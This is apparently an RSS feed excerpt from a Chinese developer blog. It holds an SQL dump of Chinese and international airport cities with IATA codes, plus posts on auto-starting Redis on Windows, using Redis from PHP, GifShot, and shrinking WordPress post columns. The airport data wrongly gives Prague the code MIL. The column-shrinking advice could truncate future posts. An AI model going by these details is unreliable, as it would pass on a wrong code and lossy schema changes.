&#39;西双版纳&#39;, &#39;X&#39;, &#39;JHG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;134&#39;, &#39;黔江&#39;, &#39;Q&#39;, &#39;JIQ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;107&#39;, &#39;吕梁&#39;, &#39;L&#39;, &#39;LLV&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;32&#39;, &#39;池州&#39;, &#39;C&#39;, &#39;JUH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;79&#39;, &#39;景德镇&#39;, &#39;J&#39;, &#39;JDZ&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;124&#39;, &#39;宁波&#39;, &#39;N&#39;, &#39;NGB&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;190&#39;, &#39;宜昌&#39;, &#39;Y&#39;, &#39;YIH&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;67&#39;, &#39;黑河&#39;, &#39;H&#39;, &#39;HEK&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;208&#39;, &#39;遵义&#39;, &#39;Z&#39;, &#39;ZYI&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;117&#39;, &#39;牡丹江&#39;, &#39;M&#39;, &#39;MDG&#39;, &#39;0&#39;, &#39;0&#39;); INSERT INTO `lk_airport_city` VALUES (&#39;54&#39;, &#39;广州&#39;, &#39;G&#39;, &#39;CAN&#39;, &#39;1&#39;, &#39;1&#39;); -- ---------------------------- -- Table structure for lk_airport_inter_city -- ---------------------------- DROP TABLE IF EXISTS `lk_airport_inter_city`; CREATE TABLE `lk_airport_inter_city` ( `city_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT, `city_name` varchar(10) NOT NULL DEFAULT &#39;&#39;, `airport_code` varchar(5) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;机场代码&#39;, `is_hot` tinyint(3) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;是否热门 1是 0否&#39;, `continents` tinyint(3) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;1亚洲 2欧洲 3美洲 4非洲 5大洋洲&#39;, PRIMARY KEY (`city_id`) ) ENGINE=MyISAM AUTO_INCREMENT=427 DEFAULT CHARSET=utf8mb4 ROW_FORMAT=DYNAMIC; -- ---------------------------- -- Records of lk_airport_inter_city -- ---------------------------- INSERT INTO `lk_airport_inter_city` VALUES (&#39;399&#39;, &#39;卡萨布兰卡&#39;, &#39;CAS&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;412&#39;, &#39;悉尼(澳大利亚)&#39;, &#39;SYD&#39;, &#39;1&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;330&#39;, &#39;莫斯科&#39;, &#39;MOW&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;335&#39;, &#39;斯德哥尔摩&#39;, &#39;STO&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;307&#39;, &#39;胡志明市&#39;, &#39;SGN&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;351&#39;, &#39;格拉斯哥&#39;, &#39;GLA&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;340&#39;, &#39;布鲁塞尔&#39;, &#39;BRU&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;318&#39;, &#39;福冈&#39;, &#39;FUK&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;312&#39;, &#39;河内&#39;, &#39;HAN&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;406&#39;, &#39;金沙萨&#39;, &#39;FIH&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;347&#39;, &#39;伯明翰(英国)&#39;, &#39;BHX&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;419&#39;, &#39;堪培拉&#39;, &#39;CBR&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;323&#39;, &#39;伊斯坦布尔&#39;, &#39;IST&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;371&#39;, &#39;塞班&#39;, &#39;SPN&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;370&#39;, &#39;夏威夷&#39;, &#39;HNL&#39;, &#39;1&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;346&#39;, &#39;爱丁堡&#39;, &#39;EDI&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;363&#39;, &#39;西雅图&#39;, &#39;SEA&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;310&#39;, &#39;名古屋&#39;, &#39;NGO&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;309&#39;, &#39;巴厘岛&#39;, &#39;DPS&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;402&#39;, &#39;卢萨卡&#39;, &#39;LUN&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;362&#39;, &#39;多伦多&#39;, &#39;YTO&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;302&#39;, &#39;新加坡&#39;, &#39;SIN&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;210&#39;, &#39;澳门&#39;, &#39;MFM&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;392&#39;, &#39;罗安达&#39;, &#39;LAD&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;344&#39;, &#39;巴塞罗那&#39;, &#39;BCN&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;328&#39;, &#39;巴黎&#39;, &#39;PAR&#39;, &#39;1&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;400&#39;, &#39;德班&#39;, &#39;DUR&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;389&#39;, &#39;开普敦&#39;, &#39;CPT&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;420&#39;, &#39;凯恩斯&#39;, &#39;CNS&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;422&#39;, &#39;黄金海岸&#39;, &#39;OOL&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;349&#39;, &#39;日内瓦&#39;, &#39;GVA&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;353&#39;, &#39;布达佩斯&#39;, &#39;BUD&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;395&#39;, &#39;亚的斯亚贝巴&#39;, &#39;ADD&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;358&#39;, &#39;洛杉矶&#39;, &#39;LAX&#39;, &#39;1&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;418&#39;, &#39;惠灵顿&#39;, &#39;WLG&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;416&#39;, &#39;阿德莱德&#39;, &#39;ADL&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;410&#39;, &#39;阿比让&#39;, &#39;ABJ&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;386&#39;, &#39;布宜诺斯艾利斯&#39;, &#39;BUE&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;211&#39;, &#39;台北&#39;, &#39;TPE&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;315&#39;, &#39;釜山&#39;, &#39;PUS&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;337&#39;, &#39;曼彻斯特(英国)&#39;, &#39;MAN&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;426&#39;, &#39;达尼丁&#39;, &#39;DUD&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;388&#39;, &#39;约翰内斯堡&#39;, &#39;JNB&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;308&#39;, &#39;马尼拉&#39;, &#39;MNL&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;342&#39;, &#39;赫尔辛基&#39;, &#39;HEL&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;331&#39;, &#39;罗马&#39;, &#39;ROM&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;397&#39;, &#39;阿克拉&#39;, &#39;ACC&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;316&#39;, &#39;加德满都&#39;, &#39;KTM&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;354&#39;, &#39;汉堡&#39;, &#39;HAM&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;343&#39;, &#39;维也纳&#39;, &#39;VIE&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;378&#39;, &#39;拉斯维加斯&#39;, &#39;LAS&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;300&#39;, &#39;东京&#39;, &#39;TYO&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;367&#39;, &#39;亚特兰大&#39;, &#39;ATL&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;365&#39;, &#39;波士顿&#39;, &#39;BOS&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;306&#39;, &#39;雅加达&#39;, &#39;JKT&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;301&#39;, &#39;首尔&#39;, &#39;SEL&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;366&#39;, &#39;底特律&#39;, &#39;DTT&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;409&#39;, &#39;费里敦&#39;, &#39;FNA&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;403&#39;, &#39;哈拉雷&#39;, &#39;HRE&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;345&#39;, &#39;雅典&#39;, &#39;ATH&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;361&#39;, &#39;芝加哥&#39;, &#39;CHI&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;380&#39;, &#39;迈阿密&#39;, &#39;MIA&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;381&#39;, &#39;丹佛&#39;, &#39;DEN&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;407&#39;, &#39;马普托&#39;, &#39;MPM&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;377&#39;, &#39;墨西哥城&#39;, &#39;MEX&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;341&#39;, &#39;哥本哈根&#39;, &#39;CPH&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;396&#39;, &#39;喀土穆&#39;, &#39;KRT&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;408&#39;, &#39;杜阿拉&#39;, &#39;DLA&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;332&#39;, &#39;阿姆斯特丹&#39;, &#39;AMS&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;379&#39;, &#39;卡尔加里&#39;, &#39;YYC&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;317&#39;, &#39;高雄&#39;, &#39;KHH&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;320&#39;, &#39;德里&#39;, &#39;DEL&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;338&#39;, &#39;马德里&#39;, &#39;MAD&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;314&#39;, &#39;迪拜&#39;, &#39;DXB&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;385&#39;, &#39;埃德蒙顿&#39;, &#39;YEA&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;329&#39;, &#39;法兰克福&#39;, &#39;FRA&#39;, &#39;1&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;324&#39;, &#39;乌兰巴托&#39;, &#39;ULN&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;326&#39;, &#39;茨城&#39;, &#39;IBR&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;360&#39;, &#39;温哥华&#39;, &#39;YVR&#39;, &#39;1&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;303&#39;, &#39;曼谷&#39;, &#39;BKK&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;393&#39;, &#39;毛里求斯&#39;, &#39;MRU&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;359&#39;, &#39;旧金山&#39;, &#39;SFO&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;311&#39;, &#39;普吉岛&#39;, &#39;HKT&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;387&#39;, &#39;开罗&#39;, &#39;CAI&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;209&#39;, &#39;香港&#39;, &#39;HKG&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;368&#39;, &#39;休斯敦&#39;, &#39;HOU&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;327&#39;, &#39;伦敦(英国)&#39;, &#39;LON&#39;, &#39;1&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;333&#39;, &#39;米兰&#39;, &#39;MIL&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;322&#39;, &#39;札幌&#39;, &#39;SPK&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;405&#39;, &#39;哈博罗内&#39;, &#39;GBE&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;373&#39;, &#39;明尼阿波利斯&#39;, &#39;MSP&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;383&#39;, &#39;波特兰(美国)&#39;, &#39;PDX&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;398&#39;, &#39;阿尔及尔&#39;, &#39;ALG&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;391&#39;, &#39;拉各斯&#39;, &#39;LOS&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;325&#39;, &#39;孟买&#39;, &#39;BOM&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;384&#39;, &#39;曼彻斯特(美国)&#39;, &#39;MHT&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;334&#39;, &#39;慕尼黑&#39;, &#39;MUC&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;369&#39;, &#39;蒙特利尔&#39;, &#39;YMQ&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;304&#39;, &#39;吉隆坡&#39;, &#39;KUL&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;425&#39;, &#39;达尔文&#39;, &#39;DRW&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;336&#39;, &#39;柏林&#39;, &#39;BER&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;376&#39;, &#39;渥太华&#39;, &#39;YOW&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;413&#39;, &#39;墨尔本(澳大利亚)&#39;, &#39;MEL&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;411&#39;, &#39;卢克索&#39;, &#39;LXR&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;305&#39;, &#39;大阪&#39;, &#39;OSA&#39;, &#39;1&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;364&#39;, &#39;华盛顿&#39;, &#39;WAS&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;414&#39;, &#39;奥克兰(新西兰)&#39;, &#39;AKL&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;357&#39;, &#39;纽约&#39;, &#39;NYC&#39;, &#39;1&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;352&#39;, &#39;基辅&#39;, &#39;IEV&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;417&#39;, &#39;珀斯&#39;, &#39;PER&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;339&#39;, &#39;苏黎世&#39;, &#39;ZRH&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;372&#39;, &#39;达拉斯&#39;, &#39;DFW&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;321&#39;, &#39;济州岛&#39;, &#39;CJU&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;375&#39;, &#39;圣保罗(巴西)&#39;, &#39;SAO&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;319&#39;, &#39;金边&#39;, &#39;PNH&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;355&#39;, &#39;布拉格&#39;, &#39;MIL&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;390&#39;, &#39;内罗毕&#39;, &#39;NBO&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;348&#39;, &#39;纽卡斯尔(英国)&#39;, &#39;NCL&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;404&#39;, &#39;雅温得&#39;, &#39;YAO&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;350&#39;, &#39;圣彼得堡&#39;, &#39;LED&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;356&#39;, &#39;杜塞尔多夫&#39;, &#39;DUS&#39;, &#39;0&#39;, &#39;2&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;394&#39;, &#39;达累斯萨拉姆&#39;, &#39;DAR&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;424&#39;, &#39;霍巴特&#39;, &#39;HBA&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;374&#39;, &#39;费城&#39;, &#39;PHL&#39;, &#39;0&#39;, &#39;3&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;415&#39;, &#39;布里斯班&#39;, &#39;BNE&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;423&#39;, &#39;帕皮堤&#39;, &#39;PPT&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;421&#39;, &#39;楠迪&#39;, &#39;NAN&#39;, &#39;0&#39;, &#39;5&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;401&#39;, &#39;突尼斯&#39;, &#39;TUN&#39;, &#39;0&#39;, &#39;4&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;313&#39;, &#39;马累&#39;, &#39;MLE&#39;, &#39;0&#39;, &#39;1&#39;); INSERT INTO `lk_airport_inter_city` VALUES (&#39;382&#39;, &#39;奥兰多&#39;, &#39;ORL&#39;, &#39;0&#39;, &#39;3&#39;);  如果觉得不太适合自己的项目也有采集的全球机场数据txt版，附上下载链接（这里要感谢车爷的友情采集）</description>
    </item>
    
    <item>
      <title>windows下自动启动Redis隐藏命令行窗口的方法</title>
      <link>https://ifunbox.top/redis_windows_autorun/</link>
      <pubDate>Fri, 16 Oct 2015 09:38:22 +0000</pubDate>
      
      <guid>https://ifunbox.top/redis_windows_autorun/</guid>
      <description>1.将启动命令写入bat。如下：
D:/dev/redis-2.4.5/redis-server.exe D:/dev/redis-2.4.5/redis.conf
保存为openredis.bat
2.利用vbs调用bat。
新建vbs文件openredis.vbs。写入命令：
CreateObject(&amp;#8220;WScript.Shell&amp;#8221;).Run &amp;#8220;cmd /c ‪D:/dev/redis-2.4.5/bin/openredis.bat&amp;#8221;,0
下面就是考虑如何调用vbs了。
3.设置开机自动启动
点击运行输入regedt32.exe打开注册表
在注册表键值
【HKEY_CURRENT_USER /Software /Microsoft /Windows /CurrentVersion /Run】新建字符串值openredis，如下图添加vbs路径，即可实现开机自动启动Redis。

&amp;nbsp;</description>
    </item>
    
    <item>
      <title>Redis在Windows下安装和PHP中使用</title>
      <link>https://ifunbox.top/redis_windows_php/</link>
      <pubDate>Fri, 16 Oct 2015 09:09:21 +0000</pubDate>
      
      <guid>https://ifunbox.top/redis_windows_php/</guid>
      <description>一直没有用redis的机会，这次新项目终于可以在统计这块用上，因为开发环境是Windows，先附上Windows安装使用教程，备忘~~
1、redis简介
redis是一个高性能的key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括 string(字符串)、list(链表)、set(集合)、zset(sorted set &amp;#8211;有序集合)和hashs（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都 是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期 性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。
Redis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部分场合可以对关系数据库起到很好的补充作用。它提供了Python，Ruby，Erlang，PHP客户端，使用很方便。
2、Windows下安装redis
下载地址Windows redis X64。下载到的Redis支持32bit和64bit。根据自己实际情况选择，我选择64bit。把64bit文件内容拷贝到需要安装的目录下,比如：D:\dev\redis-2.4.5。
打开一个cmd窗口，使用cd命令切换到指定目录（D:\dev\redis-2.4.5）运行 redis-server.exe redis.conf 。运行以后出现如下界面。

这说明Redis服务端已经安装成功。
保持这个cmd窗口，然后新打开一个cmd窗口，使用cd命令切换到指定目录（D:\dev\redis-2.4.5）运行 redis-cli.exe -h 127.0.0.1 -p 6379，其中 127.0.0.1是本地ip，6379是redis服务端的默认端口。运行成功如下图所示。
这样，Redis windows环境下搭建已经完成，简单得让人惊讶。

这样，Redis windows环境下搭建已经完成。
环境已经搭建好，总得测试下吧。比如：存储一个key为test，value为hello word的字符串，然后获取key值。

正确输出 hell word，测试成功！
3、PHP中使用&amp;#8211;安装php_redis.dll 扩展
linux:https://pecl.php.net/package/redis/2.2.7/
windows:https://pecl.php.net/package/redis/2.2.7/windows
首先把php_redis.dll放入PHP的ext文件夹，然后在php.ini配置文件里添加如下代码：
extension=php_redis.dll
重启web服务器
4、PHP中使用
代码如下
&amp;lt;?php
$redis = new Redis();
$redis-&amp;gt;connect(&amp;#8216;127.0.0.1&amp;#8217;,6379);
$redis-&amp;gt;set(&amp;#8216;test&amp;#8217;,&amp;#8217;hello redis&amp;#8217;);
echo $redis-&amp;gt;get(&amp;#8216;test&amp;#8217;);
?&amp;gt;
输出 hello redis 成功!
另附redis命令参考http://redisdoc.com/
windows下自动启动Redis隐藏命令行窗口的方法</description>
    </item>
    
    <item>
      <title>利用GifShot JavaScript库创建GIF动画</title>
      <link>https://ifunbox.top/gifshot_javascript_create_animated_gifs/</link>
      <pubDate>Wed, 14 Oct 2015 02:15:30 +0000</pubDate>
      
      <guid>https://ifunbox.top/gifshot_javascript_create_animated_gifs/</guid>
      <description>之前关于这些技术实现方式是在biu官网上看到的，几张图片播放gif动画是用css3实现的，然后寻找js实现方式，就找到了强大的GifShot。
GifShot是一个JavaScript库,可以从媒体流,视频,或者图片中提取元素创建gif动画。
GifShot优点多多啊~
易于集成
JavaScript库的性质使得它非常便携，易于集成到几乎任何网站(有点像动画gif本身)。
非常高效
通过利用web workers的力量,得到快速创建GIF,不会阻止UI。一个图像量化算法还用于减少所需数量的颜色代表形象。
强大的
利用前沿浏览器api包括WebRTC、文件系统、视频、帆布、Web Workers,类型化数组和Base 64编码支持20多个选项。
可定制的
可以使用自定义构建只包括项目所需的特定功能。
只需要引入gifshot js库，然后撸上下面的代码，就可以实现jpg，png，gif图片转换成gif动画的效果了
&amp;amp;lt;span style=&amp;quot;font-size: 14pt;&amp;quot;&amp;gt;gifshot.createGIF({ images: [ &#39;http://i.imgur.com/2OO33vX.jpg&#39;, &#39;http://i.imgur.com/qOwVaSN.png&#39;, &#39;http://i.imgur.com/Vo5mFZJ.gif&#39; ] }, function (obj) { if (!obj.error) { var image = obj.image, animatedImage = document.createElement(&#39;img&#39;); animatedImage.src = image; document.body.appendChild(animatedImage); } });&amp;amp;lt;/span&amp;gt;  就不上更多代码了，因为官网介绍得非常详细。
附上官网地址https://yahoo.github.io/gifshot/</description>
    </item>
    
    <item>
      <title>wordpress数据库posts文章表优化</title>
      <link>https://ifunbox.top/optimize_wordpress_posts_table/</link>
      <pubDate>Mon, 12 Oct 2015 07:25:01 +0000</pubDate>
      
      <guid>https://ifunbox.top/optimize_wordpress_posts_table/</guid>
      <description>wordpress数据库wp_posts文章表结构中post_content,post_title,post_excerpt,to_ping,pinged,post_content_filtered这几个字段的字段类型差点没把我吓死，都是longtext,mediumtext类型，非常占用存储空间不说，还占用传输带宽影响速度。
首先用下面这条sql语句分析下当前表数据情况，找出每个字段下最长的字符串数
SELECT MAX(LENGTH(字段名)) from wp_posts
字段名换成post_content,post_title,post_excerpt,to_ping,pinged,post_content_filtered依次搜索几下每个的最大长度
得出如我的wordpress数据库posts文章表优化建议:
post_content字段类型改成mediumtext
post_title字段类型改成varchar(255)
post_excerpt字段类型改成varchar(255)
to_ping字段类型改成varchar(50)
pinged字段类型改成varchar(100)
post_content_filtered字段类型改成varchar(50)
